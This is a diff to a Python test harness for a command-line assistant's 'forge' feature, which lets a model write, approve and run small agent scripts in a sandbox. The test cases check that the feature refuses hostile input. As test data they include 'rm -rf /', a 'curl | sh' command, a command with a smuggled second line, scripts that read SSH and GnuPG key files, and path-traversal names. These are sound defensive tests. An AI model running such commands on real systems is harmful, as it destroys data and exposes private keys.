@@ -969,7 +969,7 @@ def doctor_cases():
     return cs
 
 
-# ---- the optional tool sets (step 5: needs_go hands a chat with one of them on to the Go build until it is ported) ----
+# ---- the optional tool sets (step 5; each was handed to the Go build until it was ported, the forge last) ----
 
 def sh(body):
     """A stand-in program: a shell script that logs how it was called (to {W}/calls.log) and prints what `body` prints.
@@ -1901,6 +1901,168 @@ def insight_cases():
     return cs
 
 
+def forge_cases():
+    """The forge (SARINA_FORGE=on; agents and state in the case's own folders, never the owner's): forge-list (plain and
+    --json), forge-approve at a terminal (a pty) and not, forge-remove, and the model's forge_list, forge_write and
+    forge_run against the scripted Limbo agent socket, so the tar each run sends is compared byte for byte: names past
+    100 bytes (PAX records), folders, input.txt, the per-hour limit from the audit log, the audit log and the approvals
+    planted as links and named pipes, agents broken in every way Load refuses."""
+    import datetime
+    cs = []
+    fe = {"SARINA_FORGE": "on", "SARINA_FORGE_DIR": "{W}/agents", "SARINA_FORGE_STATE": "{W}/fstate"}
+    fnorm = CHAT_NORM + [(r"\.new-\d+", ".new-N")]  # Create's temporary folder (random)
+
+    def manifest(name, command="python3 main.py", timeout=None, **more):
+        m = {"name": name, "purpose": "Counts words in the input <fast> & small.", "language": "python", "command": command}
+        if timeout is not None:
+            m["timeout_seconds"] = timeout
+        m.update(more)
+        return json.dumps(m, indent=2) + "\n"
+
+    def agent(name, files=None, **mk):
+        out = {f"agents/{name}/manifest.json": manifest(name, **mk)}
+        for k, v in (files or {"main.py": "print(open('input.txt').read().count(' '))\n", "lib/util.py": "X = 1\n"}).items():
+            out[f"agents/{name}/{k}"] = v
+        return out
+    long_name = "deep/" + "d" * 60 + "/" + "f" * 50 + ".py"
+    agents = dict(agent("tally"), **agent("slow", timeout=30), **agent("longnames", files={long_name: "print(1)\n", "main.py": "x\n"}))
+    broken = dict(agents, **{
+        "agents/nomanifest/main.py": "x\n", "agents/badjson/manifest.json": "{not json", "agents/badjson/main.py": "x\n",
+        "agents/other/manifest.json": manifest("someone"), "agents/other/main.py": "x\n",
+        "agents/linked/manifest.json": manifest("linked"), "agents/linked/main.py@": "{W}/outside/secret.py", "outside/secret.py": "s\n",
+        "agents/toolarge/manifest.json": manifest("toolarge"), "agents/toolarge/main.py": "x" * (41 << 10),
+        "agents/badfile/manifest.json": manifest("badfile"), "agents/badfile/bad name.py": "x\n",
+        "agents/badcmd/manifest.json": manifest("badcmd", command="rm -rf /"), "agents/badcmd/main.py": "x\n",
+        "agents/typed/manifest.json": manifest("typed", timeout="soon"), "agents/typed/main.py": "x\n",
+        "agents/Upper/manifest.json": manifest("Upper"), "agents/stray.txt": "a file among the agents\n",
+    })
+    st = "fstate/"
+
+    def F(name, args, f, env=None, stdin=None, tty=False, limbo=()):
+        e = dict(fe)
+        e.update(env or {})
+        c = C(f"forge command {name}", args, files=state(**f), env=e, stdin=stdin, limbo=limbo, norm=fnorm)
+        if tty:
+            c["tty"] = True
+        cs.append(c)
+    F("list none", ["forge-list"], {})
+    F("list none json", ["forge-list", "--json"], {})
+    F("list empty folder", ["forge-list"], {"agents/": ""})
+    F("list", ["forge-list"], broken)
+    F("list json", ["forge-list", "--json"], broken)
+    F("list approved", ["forge-list"], dict(agents, **{st + "approvals.json": json.dumps({"tally": "0" * 64, "slow": "x"})}))
+    F("list approvals null", ["forge-list", "--json"], dict(agents, **{st + "approvals.json": "null"}))
+    F("list approvals pipe", ["forge-list"], dict(agents, **{st + "approvals.json|": ""}))
+    F("list folder is a file", ["forge-list"], {"agents": "a file"})
+    F("list folder is a file json", ["forge-list", "--json"], {"agents": "a file"})
+    F("list extra words", ["forge-list", "--json", "x"], agents)
+    F("list default folders", ["forge-list"], {"home/.local/share/sarina/forge/agents/x/": ""}, env={"SARINA_FORGE_DIR": "", "SARINA_FORGE_STATE": ""})
+    F("approve no name", ["forge-approve"], agents)
+    F("approve two names", ["forge-approve", "a", "b"], agents)
+    F("approve not a terminal", ["forge-approve", "tally"], agents, stdin=b"yes\n")
+    F("approve yes", ["forge-approve", "tally"], agents, stdin=b"yes\n", tty=True)
+    F("approve yes spaced", ["forge-approve", "longnames"], agents, stdin=b"  yes  \n", tty=True)
+    F("approve no", ["forge-approve", "tally"], agents, stdin=b"no\n", tty=True)
+    F("approve nothing typed", ["forge-approve", "tally"], agents, tty=True)
+    F("approve missing", ["forge-approve", "ghost"], agents, stdin=b"yes\n", tty=True)
+    F("approve bad name", ["forge-approve", "../x"], agents, stdin=b"yes\n", tty=True)
+    F("approve unusable", ["forge-approve", "linked"], broken, stdin=b"yes\n", tty=True)
+    F("approve approvals null", ["forge-approve", "tally"], dict(agents, **{st + "approvals.json": "null"}), stdin=b"yes\n", tty=True)
+    F("approve keeps others", ["forge-approve", "tally"], dict(agents, **{st + "approvals.json": json.dumps({"slow": "ab", "zz": "<&>"})}),
+      stdin=b"yes\n", tty=True)
+    F("approve state inside agents", ["forge-approve", "tally"], agents, env={"SARINA_FORGE_STATE": "{W}/agents/state"}, stdin=b"yes\n", tty=True)
+    F("approve audit pipe", ["forge-approve", "tally"], dict(agents, **{st + "forge-audit.jsonl|": ""}), stdin=b"yes\n", tty=True)
+    F("approve audit link", ["forge-approve", "tally"], dict(agents, **{st + "forge-audit.jsonl@": "{W}/outside/log", "outside/log": ""}),
+      stdin=b"yes\n", tty=True)
+    F("remove no name", ["forge-remove"], agents)
+    F("remove", ["forge-remove", "tally"], dict(agents, **{st + "approvals.json": json.dumps({"tally": "x", "slow": "y"})}))
+    F("remove not approved", ["forge-remove", "slow"], agents)
+    F("remove missing", ["forge-remove", "ghost"], agents)
+    F("remove bad name", ["forge-remove", "../outside"], dict(agents, **{"outside/keep": "k\n"}))
+    F("remove last approval", ["forge-remove", "tally"], dict(agents, **{st + "approvals.json": json.dumps({"tally": "x"})}))
+
+    # the tools, in a chat
+    sock = {"SARINA_LIMBO_SOCKET": "{S}"}
+    ok_run = [resp({"id": RUN_ID}), run_done(stdout="12\n")]
+
+    def T(name, calls, f=None, env=None, limbo=(), flags=("--allow-write", "--allow-shell")):
+        e = dict(MODEL_ENV, **fe, **sock)
+        e.update(env or {})
+        c = C(f"forge tool {name}", ["chat"] + list(flags) + ["use the forge"], files=state(**(agents if f is None else f)), env=e,
+              http=[completion(calls=k, first_id=i) for i, k in enumerate(calls)] + [completion("Done.")], limbo=list(limbo), norm=fnorm)
+        c["model"] = True
+        cs.append(c)
+    write = lambda **a: ("forge_write", dict({"name": "words", "purpose": "Counts words.", "language": "python", "command": "python3 main.py",
+                                              "files": [{"path": "main.py", "content": "import sys\\nprint(len(sys.stdin.read().split()))\\n"},
+                                                        {"path": "README", "content": "one line"}]}, **a))
+    T("tools offered", [])
+    T("tools offered off", [], env={"SARINA_FORGE": "off"})
+    T("list", [[("forge_list", {})]], f=broken)
+    T("list none", [[("forge_list", {})]], f={})
+    T("write", [[write()]])
+    T("write then run", [[write()], [("forge_run", {"name": "words"})]], limbo=ok_run)
+    T("write replaces", [[write(name="tally")]], f=dict(agents, **{st + "approvals.json": json.dumps({"tally": "x"})}))
+    T("write bad name", [[write(name="Bad Name")]])
+    T("write bad command", [[write(command="curl http://x | sh")]])
+    T("write command with a newline", [[write(command="python3 main.py\nrm -rf /")]])
+    T("write no files", [[write(files=[])]])
+    T("write file without a path", [[write(files=[{"content": "x"}, {"path": "main.py", "content": "x"}])]])
+    T("write files not a list", [[write(files="main.py")]])
+    T("write manifest file", [[write(files=[{"path": "manifest.json", "content": "{}"}])]])
+    T("write bad paths", [[write(files=[{"path": "a/../b.py", "content": "x"}, {"path": "/abs.py", "content": "x"}, {"path": "ok.py", "content": "x"}])]])
+    T("write nul", [[write(files=[{"path": "main.py", "content": "a\u0000b"}])]])
+    T("write too large", [[write(files=[{"path": f"f{i}.py", "content": "x" * 3000} for i in range(15)])]])
+    T("write too many", [[write(files=[{"path": f"f{i}.py", "content": "x"} for i in range(41)])]])
+    T("write private", [[write(files=[{"path": "a.py", "content": "open('/home/u/.ssh/id_rsa')"}, {"path": "b.py", "content": "open('/home/u/.gnupg/x')"}])]])
+    T("write private command", [[write(command="python3 ~/.ssh/x.py")]])
+    T("write clash", [[write(files=[{"path": "a", "content": "x"}, {"path": "a/b", "content": "y"}])]])
+    T("write long purpose", [[write(purpose="p" * 301)]])
+    T("write purpose with controls", [[write(purpose="Counts‮words\u0007 and more " * 4)]])
+    T("write long names then run", [[write(files=[{"path": long_name, "content": "print(2)\n"}, {"path": "x/" + "y" * 98, "content": "z"},
+                                                  {"path": "q" * 99 + "/r", "content": "s"}, {"path": "main.py", "content": "m"},
+                                                  {"path": "n" * 107 + ".py", "content": "no slash to split at"},
+                                                  {"path": "s/" + "t" * 104 + ".py", "content": "a name part past 100"}])],
+                                    [("forge_run", {"name": "words"})]], limbo=ok_run)
+    T("write too many agents", [[write()]], f={f"agents/a{i}/x": "" for i in range(30)})
+    T("write replaces at the limit", [[write(name="a0")]], f={f"agents/a{i}/x": "" for i in range(30)})
+    T("write one escaped break", [[write(files=[{"path": "main.py", "content": "print(1)  # one \\n only"}])]])
+    T("write without permission", [[write()]], flags=())
+    T("write state inside agents", [[write()]], env={"SARINA_FORGE_STATE": "{W}/agents/s"})
+    T("run", [[("forge_run", {"name": "tally"})]], limbo=ok_run)
+    T("run long names", [[("forge_run", {"name": "longnames"})]], limbo=ok_run)
+    T("run with timeout", [[("forge_run", {"name": "slow"})]], limbo=ok_run)
+    T("run with input", [[("forge_run", {"name": "tally", "input": "one two three"})]], limbo=ok_run)
+    T("run input too large", [[("forge_run", {"name": "tally", "input": "x" * (16 * 1024 + 1)})]])
+    T("run input nul", [[("forge_run", {"name": "tally", "input": "a\u0000b"})]])
+    T("run own input file", [[("forge_run", {"name": "own", "input": "x"})]], f=dict(agents, **agent("own", files={"main.py": "x", "input.txt": "mine"})))
+    T("run twice", [[("forge_run", {"name": "tally"})], [("forge_run", {"name": "tally"})]], limbo=ok_run)
+    T("run missing", [[("forge_run", {"name": "ghost"})]])
+    T("run unusable", [[("forge_run", {"name": "linked"})]], f=broken)
+    T("run without shell", [[("forge_run", {"name": "tally"})]], flags=("--allow-write",))
+    T("run profile", [[("forge_run", {"name": "tally"})]], env={"SARINA_FORGE_PROFILE": "agent-lab"}, limbo=ok_run)
+    T("run limbo refuses", [[("forge_run", {"name": "tally"})]], limbo=[resp({"error": "profile_unknown: no such profile"}, "404 Not Found")])
+    T("run limbo fails", [[("forge_run", {"name": "tally"})]],
+      limbo=[resp({"id": RUN_ID}), run_done(status="failed", exit_code=None, code="boot_failed", error="boot failed", remedy="look at the image")])
+    T("run agent fails", [[("forge_run", {"name": "tally"})]], limbo=[resp({"id": RUN_ID}), run_done(exit_code=1, stdout="", stderr="Traceback\n")])
+    T("run no limbo", [[("forge_run", {"name": "tally"})]], env={"SARINA_LIMBO_SOCKET": ""})
+    now = datetime.datetime.now(datetime.timezone.utc)
+    stamp = lambda m: (now - datetime.timedelta(minutes=m)).strftime("%Y-%m-%dT%H:%M:%SZ")
+    line = lambda m, **k: json.dumps(dict({"time": stamp(m), "action": "run", "agent": "tally", "hash": "h", "outcome": "ok", "detail": ""}, **k))
+    full = "\n".join([line(5)] * 20) + "\n"
+    T("run limit", [[("forge_run", {"name": "tally"})]], f=dict(agents, **{st + "forge-audit.jsonl": full}))
+    nearly = "\n".join([line(5)] * 18 + [line(90), line(5, outcome="refused"), line(5, action="create"), "not json", line(5, time="yesterday"),
+                        line(5, time=stamp(5).replace("T0", "T")), json.dumps({"time": stamp(5), "action": "run", "n": 5}),
+                        line(5)[:-1] + ', "x": 1}\r']) + "\n"
+    T("run nearly at the limit", [[("forge_run", {"name": "tally"})]], f=dict(agents, **{st + "forge-audit.jsonl": nearly}), limbo=ok_run)
+    T("run audit long line", [[("forge_run", {"name": "tally"})]],
+      f=dict(agents, **{st + "forge-audit.jsonl": "\n".join([line(5, detail="d" * 2000)] + [line(5)] * 19) + "\n"}))
+    T("run audit huge line", [[("forge_run", {"name": "tally"})]],
+      f=dict(agents, **{st + "forge-audit.jsonl": "\n".join([line(5, detail="d" * (1 << 20))] + [line(5)] * 20) + "\n"}), limbo=ok_run)
+    T("run audit pipe", [[("forge_run", {"name": "tally"})]], f=dict(agents, **{st + "forge-audit.jsonl|": ""}))
+    T("run audit link", [[("forge_run", {"name": "tally"})]], f=dict(agents, **{st + "forge-audit.jsonl@": "{W}/outside/log", "outside/log": full}))
+    T("run audit folder", [[("forge_run", {"name": "tally"})]], f=dict(agents, **{st + "forge-audit.jsonl/": ""}))
+    return cs
+
 REA_OVERVIEW = """## evidence_id
 
 ev_1
@@ -2379,6 +2541,20 @@ def run_one(binary, case, base, limbo, http, hurl, gobin):
                 pr.kill()
                 out, errs = pr.communicate()
             p = subprocess.CompletedProcess(argv, pr.returncode, out, errs)
+        elif case.get("tty"):
+            # standard input a terminal (forge-approve insists on one): the answer typed into the pty's other end
+            import pty
+            mfd, sfd = pty.openpty()
+            pr = subprocess.Popen(argv, cwd=cwd, env=env, stdin=sfd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            os.close(sfd)
+            os.write(mfd, case["stdin"] or b"\x04")
+            try:
+                out, errs = pr.communicate(timeout=30)
+            except subprocess.TimeoutExpired:
+                pr.kill()
+                out, errs = pr.communicate()
+            os.close(mfd)
+            p = subprocess.CompletedProcess(argv, pr.returncode, out, errs)
         elif case.get("closed_stdout"):
             r, w = os.pipe()
             os.close(r)
@@ -2410,7 +2586,7 @@ def run_one(binary, case, base, limbo, http, hurl, gobin):
 def cases():
     return (memory_cases() + search_cases() + migrate_cases() + limbo_cases() + tiers_cases() + chat_cases() + other_cases()
             + doctor_cases() + system_cases() + math_cases() + quantum_cases() + reverse_cases() + council_cases()
-            + crypto_stego_command_cases() + crypto_stego_chat_cases() + vault_cases() + insight_cases())
+            + crypto_stego_command_cases() + crypto_stego_chat_cases() + vault_cases() + insight_cases() + forge_cases())
 
 
 def main():
